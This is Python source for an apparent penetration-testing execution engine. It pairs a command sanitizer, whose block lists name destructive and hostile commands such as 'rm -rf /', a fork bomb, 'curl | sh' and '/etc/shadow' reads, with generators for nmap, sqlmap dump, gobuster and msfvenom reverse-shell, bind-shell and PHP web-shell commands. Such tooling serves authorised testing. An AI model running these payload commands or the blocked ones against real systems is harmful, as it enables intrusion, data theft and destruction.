"""
DRAKBEN Execution Engine
Author: @drak_ben
Description: 5 modules for intelligent command execution and monitoring
"""

import logging
import os
import platform
import queue
import re
import shlex
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from enum import Enum
from typing import Callable, Dict, List, Optional, Tuple

# Setup logger
logger = logging.getLogger(__name__)


class SecurityError(Exception):
    """Raised when a security violation is detected"""
    pass


class CommandSanitizer:
    """
    Security layer for command sanitization.
    Prevents shell injection and blocks dangerous commands.
    """
    
    # Patterns that indicate shell injection attempts
    SHELL_INJECTION_PATTERNS = [
        r';\s*rm\s',           # ; rm 
        r'\|\s*rm\s',          # | rm
        r'`[^`]*`',            # Command substitution with backticks
        r'\$\([^)]+\)',        # Command substitution with $()
        r'>\s*/dev/',          # Redirect to /dev/
        r'>\s*/etc/',          # Redirect to /etc/
        r'\|\|',               # OR operator (can be used for fallback attacks)
        r'&&\s*rm\s',          # && rm
        r';\s*cat\s+/etc/passwd',  # Password file access
        r';\s*cat\s+/etc/shadow',  # Shadow file access
    ]
    
    # Commands that are completely forbidden
    FORBIDDEN_COMMANDS = [
        'rm -rf /',
        'rm -rf /*',
        'rm -rf ~',
        'rm -rf ~/*',
        'mkfs',
        'dd if=/dev/zero',
        'dd if=/dev/random',
        ':(){ :|:& };:',       # Fork bomb
        'shutdown',
        'reboot',
        'halt',
        'poweroff',
        'init 0',
        'init 6',
        'chmod -R 777 /',
        'chown -R',
        'wget -O- | sh',
        'curl | sh',
        'curl | bash',
        'wget -O- | bash',
    ]
    
    # Commands that require explicit confirmation
    HIGH_RISK_PATTERNS = [
        r'rm\s+-[rf]+',        # rm with -r or -f flags
        r'chmod\s+[0-7]{3,4}\s+/(etc|bin|usr|var|boot|sbin)', # Forbidden system chmod
        r'chown\s+.*?\s+/(etc|bin|usr|var|boot|sbin)',       # Forbidden system chown
        r'mv\s+.*?\s+/(etc|bin|usr|var|boot|sbin)',          # Forbidden system mv
        r'>\s*/(etc|bin|usr|var|boot|sbin)',                 # Forbidden redirection to system
        r'sudo\s+',            # sudo commands
        r'su\s+',              # su commands
    ]
    
    @classmethod
    def sanitize(cls, command: str, allow_shell: bool = False) -> str:
        """
        Sanitize command for safe execution.
        
        Args:
            command: The command to sanitize
            allow_shell: Whether shell features are explicitly allowed
            
        Returns:
            Sanitized command
            
        Raises:
            SecurityError: If command contains forbidden patterns
        """
        # Check for forbidden commands
        command_lower = command.lower().strip()
        for forbidden in cls.FORBIDDEN_COMMANDS:
            if forbidden.lower() in command_lower:
                raise SecurityError(f"Forbidden command detected: {forbidden}")
        
        # Check for shell injection patterns (only if shell mode is disabled)
        if not allow_shell:
            for pattern in cls.SHELL_INJECTION_PATTERNS:
                if re.search(pattern, command, re.IGNORECASE):
                    raise SecurityError(f"Potential shell injection detected: pattern '{pattern}'")
        
        return command
    
    @classmethod
    def is_high_risk(cls, command: str) -> bool:
        """Check if command is high-risk and needs confirmation"""
        for pattern in cls.HIGH_RISK_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                return True
        return False
    
    @classmethod
    def get_risk_level(cls, command: str) -> str:
        """
        Get risk level of a command.
        
        Returns:
            'low', 'medium', 'high', or 'critical'
        """
        command_lower = command.lower()
        
        # Check for forbidden (critical)
        for forbidden in cls.FORBIDDEN_COMMANDS:
            if forbidden.lower() in command_lower:
                return 'critical'
        
        # Check for high-risk patterns
        if cls.is_high_risk(command):
            return 'high'
        
        # Check for medium-risk commands
        medium_risk = ['curl', 'wget', 'nc', 'netcat', 'ncat', 'python -c', 'perl -e', 'ruby -e']
        if any(cmd in command_lower for cmd in medium_risk):
            return 'medium'
        
        return 'low'


class ExecutionStatus(Enum):
    """Status of command execution"""

    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


@dataclass
class ExecutionResult:
    """Result of command execution"""

    command: str
    status: ExecutionStatus
    stdout: str
    stderr: str
    exit_code: int
    duration: float
    timestamp: float


# ====================
# MODULE 1: SmartTerminal
# ====================
class SmartTerminal:
    """Intelligent command executor with safety and monitoring"""

    def __init__(self):
        self.execution_history: List[ExecutionResult] = []
        self.current_process: Optional[subprocess.Popen] = None
        self.sanitizer = CommandSanitizer()

    def execute(
        self,
        command: str,
        timeout: int = 300,
        capture_output: bool = True,
        shell: bool = False,
        callback: Optional[Callable] = None,
        skip_sanitization: bool = False,
    ) -> ExecutionResult:
        """
        Execute command with monitoring and security checks.
        """
        start_time = time.time()

        try:
            # 1. Prepare Command (Sanitize & Parse)
            try:
                sanitized_cmd, cmd_args = self._prepare_command(command, shell, skip_sanitization)
            except SecurityError as e:
                logger.warning(f"Security violation blocked: {e}")
                return ExecutionResult(
                    command=command,
                    status=ExecutionStatus.FAILED,
                    stdout="",
                    stderr=f"SECURITY ERROR: {str(e)}",
                    exit_code=-1,
                    duration=0.0,
                    timestamp=start_time,
                )
            
            # 2. Execute process
            process = self._create_process(cmd_args, shell, capture_output)
            self.current_process = process

            # 3. Wait for result
            stdout, stderr, exit_code, status = self._wait_for_process(process, timeout, sanitized_cmd)
            
            duration = time.time() - start_time
            result = ExecutionResult(
                command=sanitized_cmd,
                status=status,
                stdout=stdout,
                stderr=stderr,
                exit_code=exit_code,
                duration=duration,
                timestamp=start_time,
            )

            self.execution_history.append(result)
            if callback:
                callback(result)
            return result

        except Exception as e:
            return self._handle_execution_error(command, e, start_time)
        finally:
            self.current_process = None

    def _prepare_command(self, command: str, shell: bool, skip_sanitization: bool) -> Tuple[str, List[str]]:
        """Prepare command for execution: sanitize and split"""
        # SECURITY: Sanitize command before execution
        if not skip_sanitization:
            command = CommandSanitizer.sanitize(command, allow_shell=shell)

        # Log high-risk commands
        risk_level = CommandSanitizer.get_risk_level(command)
        if risk_level in ('high', 'critical'):
            logger.warning(f"Executing {risk_level} risk command: {command[:100]}...")

        if shell:
            logger.warning("Shell execution enabled - this is a security risk")
            cmd_args = command
        else:
            cmd_args = shlex.split(command)
            
        return command, cmd_args

    def _create_process(self, cmd_args, shell: bool, capture_output: bool) -> subprocess.Popen:
        """Create and start the subprocess"""
        popen_kwargs = {
            "shell": shell,
            "text": True if capture_output else False,
        }
        
        # Use process groups for better cleanup (Unix/Linux)
        if platform.system() != "Windows":
            popen_kwargs["start_new_session"] = True
        
        if capture_output:
            popen_kwargs["stdout"] = subprocess.PIPE
            popen_kwargs["stderr"] = subprocess.PIPE
        else:
            popen_kwargs["stdout"] = subprocess.DEVNULL
            popen_kwargs["stderr"] = subprocess.DEVNULL
        
        return subprocess.Popen(cmd_args, **popen_kwargs)

    def _wait_for_process(self, process: subprocess.Popen, timeout: int, command_preview: str) -> Tuple[str, str, int, ExecutionStatus]:
        """Wait for process completion or timeout"""
        try:
            stdout, stderr = process.communicate(timeout=timeout)
            exit_code = process.returncode
            status = (
                ExecutionStatus.SUCCESS
                if exit_code == 0
                else ExecutionStatus.FAILED
            )
            return stdout or "", stderr or "", exit_code, status
            
        except subprocess.TimeoutExpired:
            self._terminate_process_group(process)
            
            # Get phase output
            try:
                stdout, stderr = process.communicate(timeout=1)
            except subprocess.TimeoutExpired:
                 stdout, stderr = "", "Command timed out and could not be cleaned up"
            
            logger.warning(f"Command timed out after {timeout}s: {command_preview[:50]}...")
            return stdout or "", stderr or "", -1, ExecutionStatus.TIMEOUT

    def _terminate_process_group(self, process: subprocess.Popen):
        """Terminate process and all children"""
        try:
            if platform.system() != "Windows":
                try:
                    pgid = os.getpgid(process.pid)
                    os.killpg(pgid, signal.SIGTERM)
                    time.sleep(0.5)
                    try:
                        os.killpg(pgid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                except (ProcessLookupError, OSError):
                    process.terminate()
                    time.sleep(0.5)
                    process.kill()
            else:
                # Windows
                try:
                    process.terminate()
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    subprocess.run(
                        ["taskkill", "/F", "/T", "/PID", str(process.pid)],
                        capture_output=True,
                        timeout=2
                    )
        except Exception as e:
            logger.warning(f"Error during process cleanup: {e}")
            try:
                process.kill()
            except:
                pass

    def _handle_execution_error(self, command: str, error: Exception, start_time: float) -> ExecutionResult:
        """Handle generic execution error"""
        duration = time.time() - start_time
        logger.error(f"Command execution failed: {error}")
        result = ExecutionResult(
            command=command,
            status=ExecutionStatus.FAILED,
            stdout="",
            stderr=str(error),
            exit_code=-1,
            duration=duration,
            timestamp=start_time,
        )
        self.execution_history.append(result)
        return result

    def execute_async(
        self, 
        command: str, 
        shell: bool = False,
        skip_sanitization: bool = False
    ) -> subprocess.Popen:
        """
        Execute command asynchronously with security checks.
        
        Args:
            command: Command to execute
            shell: Whether to use shell execution (SECURITY RISK if True)
            skip_sanitization: Skip security checks (USE WITH CAUTION)
            
        Returns:
            subprocess.Popen object for the running process
        """
        # SECURITY: Sanitize command before execution
        if not skip_sanitization:
            command = CommandSanitizer.sanitize(command, allow_shell=shell)
        
        if shell:
            logger.warning("Async shell execution enabled - this is a security risk")
            cmd_args = command
        else:
            cmd_args = shlex.split(command)
            
        process = subprocess.Popen(
            cmd_args,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        self.current_process = process
        return process

    def cancel_current(self) -> bool:
        """Cancel currently running command"""
        if self.current_process:
            self.current_process.kill()
            return True
        return False

    def get_last_result(self) -> Optional[ExecutionResult]:
        """Get last execution result"""
        return self.execution_history[-1] if self.execution_history else None


# ====================
# MODULE 2: CommandGenerator
# ====================
class CommandGenerator:
    """Generates optimized commands for different tools"""

    def generate_nmap_command(
        self,
        target: str,
        scan_type: str = "full",
        ports: Optional[str] = None,
        script: Optional[str] = None,
    ) -> str:
        """Generate optimized nmap command"""

        if scan_type == "quick":
            cmd = f"nmap -T4 -F {target}"
        elif scan_type == "stealth":
            cmd = f"nmap -sS -T2 {target}"
        elif scan_type == "aggressive":
            cmd = f"nmap -A -T4 {target}"
        elif scan_type == "version":
            cmd = f"nmap -sV -T4 {target}"
        else:  # full
            cmd = f"nmap -sV -sC -T4 {target}"

        if ports:
            cmd += f" -p {ports}"

        if script:
            cmd += f" --script={script}"

        cmd += " -oN nmap_scan.txt"

        return cmd

    def generate_sqlmap_command(
        self,
        url: str,
        level: int = 1,
        risk: int = 1,
        dbs: bool = False,
        tables: bool = False,
        dump: bool = False,
    ) -> str:
        """Generate sqlmap command"""
        cmd = f"sqlmap -u '{url}' --batch --level={level} --risk={risk}"

        if dbs:
            cmd += " --dbs"
        elif tables:
            cmd += " --tables"
        elif dump:
            cmd += " --dump"

        return cmd

    def generate_gobuster_command(
        self,
        url: str,
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        extensions: Optional[str] = None,
    ) -> str:
        """Generate gobuster command"""
        cmd = f"gobuster dir -u {url} -w {wordlist}"

        if extensions:
            cmd += f" -x {extensions}"

        cmd += " -o gobuster_results.txt"

        return cmd

    def generate_payload_command(
        self, payload_type: str, lhost: str, lport: int
    ) -> str:
        """Generate payload generation command"""
        if payload_type == "reverse_shell":
            return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
        elif payload_type == "bind_shell":
            return (
                f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind.elf"
            )
        elif payload_type == "web_shell":
            return (
                f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php"
            )
        else:
            return f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw"

    def optimize_command(self, command: str) -> str:
        """Optimize command for better performance"""
        # Add timeouts
        if "curl" in command and "--connect-timeout" not in command:
            command += " --connect-timeout 10"

        # Add output redirection if missing
        if any(tool in command for tool in ["nmap", "gobuster", "nikto"]):
            if "-o" not in command and ">" not in command:
                command += " -oN scan_output.txt"

        return command


# ====================
# MODULE 3: OutputAnalyzer
# ====================
class OutputAnalyzer:
    """Analyzes and parses command output intelligently"""

    def analyze(self, result: ExecutionResult) -> Dict:
        """Analyze execution result and extract insights"""
        analysis = {
            "success": result.status == ExecutionStatus.SUCCESS,
            "duration": result.duration,
            "exit_code": result.exit_code,
            "has_errors": bool(result.stderr),
            "insights": [],
        }

        # Detect tool type from command
        if "nmap" in result.command:
            analysis.update(self._analyze_nmap(result.stdout))
        elif "sqlmap" in result.command:
            analysis.update(self._analyze_sqlmap(result.stdout))
        elif "gobuster" in result.command:
            analysis.update(self._analyze_gobuster(result.stdout))
        elif "nikto" in result.command:
            analysis.update(self._analyze_nikto(result.stdout))

        # Check for common errors
        analysis["error_type"] = self._detect_error_type(result.stderr)

        return analysis

    def _analyze_nmap(self, output: str) -> Dict:
        """Analyze nmap output"""
        insights = []
        open_ports = []

        # Find open ports
        port_pattern = r"(\d+)/tcp\s+open\s+(\w+)"
        matches = re.findall(port_pattern, output)

        for port, service in matches:
            open_ports.append({"port": port, "service": service})
            insights.append(f"Found open port {port} ({service})")

        return {
            "tool": "nmap",
            "open_ports": open_ports,
            "total_open": len(open_ports),
            "insights": insights,
        }

    def _analyze_sqlmap(self, output: str) -> Dict:
        """Analyze sqlmap output"""
        insights = []
        vulnerable = False

        if "is vulnerable" in output.lower():
            vulnerable = True
            insights.append("SQL injection vulnerability found!")

        if "available databases" in output.lower():
            insights.append("Database enumeration successful")

        return {"tool": "sqlmap", "vulnerable": vulnerable, "insights": insights}

    def _analyze_gobuster(self, output: str) -> Dict:
        """Analyze gobuster output"""
        insights = []
        found_dirs = []

        # Find discovered directories
        dir_pattern = r"(/.+?)\s+\(Status:\s+(\d+)\)"
        matches = re.findall(dir_pattern, output)

        for path, status in matches:
            found_dirs.append({"path": path, "status": status})
            if status == "200":
                insights.append(f"Found accessible directory: {path}")

        return {
            "tool": "gobuster",
            "found_directories": found_dirs,
            "total_found": len(found_dirs),
            "insights": insights,
        }

    def _analyze_nikto(self, output: str) -> Dict:
        """Analyze nikto output"""
        insights = []

        if "0 host(s) tested" not in output:
            insights.append("Web server scan completed")

        return {"tool": "nikto", "insights": insights}

    def _detect_error_type(self, stderr: str) -> Optional[str]:
        """Detect type of error from stderr"""
        if not stderr:
            return None

        stderr_lower = stderr.lower()

        if "command not found" in stderr_lower or "not recognized" in stderr_lower:
            return "missing_tool"
        elif "permission denied" in stderr_lower:
            return "permission_error"
        elif (
            "no route to host" in stderr_lower or "network unreachable" in stderr_lower
        ):
            return "network_error"
        elif "timeout" in stderr_lower:
            return "timeout_error"
        elif "connection refused" in stderr_lower:
            return "connection_error"
        else:
            return "unknown_error"


# ====================
# MODULE 4: StreamingMonitor
# ====================
class StreamingMonitor:
    """Monitors command execution in real-time"""

    def __init__(self):
        self.output_queue = queue.Queue()
        self.monitoring = False

    def monitor_process(
        self, process: subprocess.Popen, callback: Optional[Callable] = None
    ) -> Tuple[str, str]:
        """Monitor process output in real-time"""
        stdout_lines = []
        stderr_lines = []

        def read_stdout():
            for line in process.stdout:
                stdout_lines.append(line)
                if callback:
                    callback("stdout", line)

        def read_stderr():
            for line in process.stderr:
                stderr_lines.append(line)
                if callback:
                    callback("stderr", line)

        # Start threads
        stdout_thread = threading.Thread(target=read_stdout)
        stderr_thread = threading.Thread(target=read_stderr)

        stdout_thread.start()
        stderr_thread.start()

        # Wait for completion
        process.wait()
        stdout_thread.join()
        stderr_thread.join()

        return "".join(stdout_lines), "".join(stderr_lines)

    def stream_output(self, line_type: str, line: str):
        """Stream output to queue"""
        self.output_queue.put((line_type, line, time.time()))

    def get_latest_output(self) -> List[Tuple[str, str, float]]:
        """Get all queued output"""
        output = []
        while not self.output_queue.empty():
            output.append(self.output_queue.get())
        return output


# ====================
# MODULE 5: ExecutionValidator
# ====================
class ExecutionValidator:
    """Validates execution results and checks success criteria"""

    def validate(self, result: ExecutionResult, expected: Dict) -> Dict:
        """Validate execution result against expectations"""
        validation = {"valid": True, "checks": [], "failures": []}

        # Validate each expected criterion
        self._validate_exit_code(result, expected, validation)
        self._validate_output_contains(result, expected, validation)
        self._validate_no_errors(result, expected, validation)
        self._validate_duration(result, expected, validation)

        return validation

    def _validate_exit_code(self, result: ExecutionResult, expected: Dict, validation: Dict) -> None:
        """Validate exit code matches expected value"""
        if expected.get("exit_code") is None:
            return
        
        if result.exit_code == expected["exit_code"]:
            validation["checks"].append("Exit code matches")
        else:
            validation["valid"] = False
            validation["failures"].append(
                f"Exit code {result.exit_code} != {expected['exit_code']}"
            )

    def _validate_output_contains(self, result: ExecutionResult, expected: Dict, validation: Dict) -> None:
        """Validate output contains expected patterns"""
        output_patterns = expected.get("output_contains")
        if not output_patterns:
            return
        
        for pattern in output_patterns:
            if pattern in result.stdout:
                validation["checks"].append(f"Output contains '{pattern}'")
            else:
                validation["valid"] = False
                validation["failures"].append(f"Output missing '{pattern}'")

    def _validate_no_errors(self, result: ExecutionResult, expected: Dict, validation: Dict) -> None:
        """Validate no errors in stderr"""
        if not expected.get("no_errors", False):
            return
        
        if not result.stderr:
            validation["checks"].append("No errors in stderr")
        else:
            validation["valid"] = False
            validation["failures"].append("Stderr contains errors")

    def _validate_duration(self, result: ExecutionResult, expected: Dict, validation: Dict) -> None:
        """Validate execution duration within limit"""
        max_duration = expected.get("max_duration")
        if not max_duration:
            return
        
        if result.duration <= max_duration:
            validation["checks"].append("Duration within limit")
        else:
            validation["valid"] = False
            validation["failures"].append(
                f"Duration {result.duration}s > {max_duration}s"
            )

    def is_successful(self, result: ExecutionResult) -> bool:
        """Quick check if execution was successful"""
        return result.status == ExecutionStatus.SUCCESS and result.exit_code == 0

    def extract_error_message(self, result: ExecutionResult) -> Optional[str]:
        """Extract meaningful error message"""
        if result.stderr:
            # Get first meaningful line
            lines = result.stderr.strip().split("\n")
            for line in lines:
                if line.strip() and not line.startswith("#"):
                    return line.strip()
        return None


# ====================
# UNIFIED FACADE
# ====================
class ExecutionEngine:
    """Main facade combining all 5 execution modules"""

    def __init__(self):
        self.terminal = SmartTerminal()
        self.generator = CommandGenerator()
        self.analyzer = OutputAnalyzer()
        self.monitor = StreamingMonitor()
        self.validator = ExecutionValidator()

    def execute_smart(
        self,
        command: str,
        timeout: int = 300,
        optimize: bool = True,
        callback: Optional[Callable] = None,
    ) -> Dict:
        """Execute command with full intelligence"""

        # Optimize if requested
        if optimize:
            command = self.generator.optimize_command(command)

        # Execute
        result = self.terminal.execute(command, timeout=timeout, callback=callback)

        # Analyze
        analysis = self.analyzer.analyze(result)

        # Validate
        validation = self.validator.validate(result, {"exit_code": 0})

        return {
            "result": result,
            "analysis": analysis,
            "validation": validation,
            "success": self.validator.is_successful(result),
        }

    def execute_with_monitoring(
        self, command: str, progress_callback: Optional[Callable] = None
    ) -> Dict:
        """Execute command with real-time monitoring"""
        process = self.terminal.execute_async(command)

        stdout, stderr = self.monitor.monitor_process(process, progress_callback)

        result = ExecutionResult(
            command=command,
            status=(
                ExecutionStatus.SUCCESS
                if process.returncode == 0
                else ExecutionStatus.FAILED
            ),
            stdout=stdout,
            stderr=stderr,
            exit_code=process.returncode,
            duration=0.0,
            timestamp=time.time(),
        )

        analysis = self.analyzer.analyze(result)

        return {
            "result": result,
            "analysis": analysis,
            "success": self.validator.is_successful(result),
        }

    def get_execution_summary(self) -> Dict:
        """Get summary of all executions"""
        history = self.terminal.execution_history

        return {
            "total_executions": len(history),
            "successful": sum(
                1 for r in history if r.status == ExecutionStatus.SUCCESS
            ),
            "failed": sum(1 for r in history if r.status == ExecutionStatus.FAILED),
            "average_duration": (
                sum(r.duration for r in history) / len(history) if history else 0
            ),
            "last_command": history[-1].command if history else None,
        }
